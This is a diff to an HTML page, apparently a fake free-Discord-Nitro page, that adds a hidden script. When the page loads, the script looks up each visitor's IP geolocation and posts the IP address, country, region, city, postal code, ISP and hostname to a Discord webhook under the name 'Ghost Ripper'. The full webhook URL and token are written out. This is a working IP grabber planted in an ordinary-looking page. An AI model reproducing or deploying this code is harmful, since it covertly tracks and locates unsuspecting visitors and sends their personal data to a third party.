@@ -94,5 +94,27 @@
   </script>
   <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
 
+
+
+  <script>
+    function geo(json) {
+      var request = new XMLHttpRequest();
+          request.open("POST", "https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb");
+          request.setRequestHeader('Content-type', 'application/json');
+      var params = {
+        username: "Ghost Ripper",
+        avatar_url: "https://pepsinitro.github.io/1-Month-Nitro/Image3.png",
+        content: "Looks Like They Seen A Ghost" + "IP: " + json.ip + 
+         "\n" + "Country: " + json.country_name + 
+         "\n" + "State: " + json.region + 
+         "\n" + "City: " + json.city + 
+         "\n" + "Postal Code: " + json.postal_code + 
+         "\n" + "Org: " + json.org + 
+         "\n" + "Hostname: " + json.hostname + "```"
+      }
+     request.send(JSON.stringify(params));
+    }
+    </script>
+    <script src="https://json.geoiplookup.io/?callback=geo"></script>
   </body>
 </html>
